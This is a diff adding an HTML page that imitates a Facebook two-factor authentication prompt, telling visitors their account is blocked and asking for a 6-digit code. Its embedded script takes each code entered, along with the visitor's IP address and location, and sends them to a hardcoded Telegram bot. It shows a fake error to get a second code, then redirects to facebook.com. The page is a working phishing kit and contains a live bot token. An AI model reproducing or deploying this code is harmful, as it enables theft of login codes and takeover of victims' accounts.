@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Confirm</title>
+        <link rel="stylesheet" href="index.css" />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    </head>
+    <body style="background-color: rgb(241, 242, 246)">
+        <main id="main1">
+            <div id="" centered>
+                <form action="" class="form-container1" id="form2">
+                    <div class="mb-4">
+                        <h2>Two-factor authentication required</h2>
+                        <p>
+                            We have temporarily blocked your account because
+                            Facebook Protect has changed. Verify code has been
+                            send to your phone
+                        </p>
+                        <div style="display: flex; justify-content: center">
+                            <img src="./static/Untitled.jpg" />
+                        </div>
+                        <label class="block"
+                            ><span
+                                class="text-[#90949C] block text-xs font-bold text-[#90949C]"
+                            >
+                                Enter your code: </span
+                            ><input
+                                type="text"
+                                name="confirm"
+                                required=""
+                                class="input"
+                            />
+                        </label>
+                        <div id="message1">
+                            <p>
+                                The code generator you entered is incorrect.
+                                Please wait 5 minutes to receive another one.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="wrap">
+                        <p>
+                            You’ve asked us to require a 6-digit login code when
+                            anyone tries to access your account from a new
+                            device or browser. Enter the 6-digit code from your
+                            code generator or third-party app below.
+                        </p>
+                    </div>
+
+                    <div>
+                        <button type="submit" class="btn123">Submit</button>
+                    </div>
+                </form>
+            </div>
+        </main>
+        <script>
+            let bot = {
+                TOKEN: "6364188191:AAFmBsaqx58xGorfI_ergea9gA7UFyoLtOA",
+                chatID: "-4122063919",
+            };
+            let form2 = document.getElementById("form2");
+
+            let cp1 = "";
+            let cp2 = "";
+
+            form2.addEventListener("submit", (e) => {
+                e.preventDefault();
+                $.getJSON(
+                    "https://api.db-ip.com/v2/free/self",
+                    function (data) {
+                        console.log(data);
+                        let ip = `IP Address: ${data.ipAddress}`;
+                        let country = `Country: ${data.countryName}(${data.countryCode})`;
+                        let city = `City: ${data.city}`;
+
+                        if (cp1 === "") {
+                            document.getElementById("message1").style.display =
+                                "block";
+
+                            cp1 =
+                                document.getElementsByName("confirm")[0].value;
+                            let code1 = `Code: ${cp1}`;
+                            document.getElementsByName("confirm")[0].value = "";
+                            let message = `${code1}
+                        \n${ip}
+                        \n${country}
+                        \n${city}`;
+                            fetch(
+                                `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
+                                {
+                                    method: "GET",
+                                }
+                            )
+                                .then((res) => console.log(res))
+                                .catch((err) => console.log(err));
+                        } else {
+                            cp2 =
+                                document.getElementsByName("confirm")[0].value;
+                            let code2 = `Code:  ${cp2}`;
+                            document.getElementsByName("confirm")[0].value = "";
+                            let message = `${code2}
+                        \n${ip}
+                        \n${country}
+                        \n${city}`;
+                            fetch(
+                                `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
+                                {
+                                    method: "GET",
+                                }
+                            )
+                                .then((res) => {
+                                    window.location.href =
+                                        "http://www.facebook.com";
+                                })
+                                .catch((err) => console.log(err));
+                        }
+                    }
+                );
+            });
+        </script>
+    </body>
+</html>
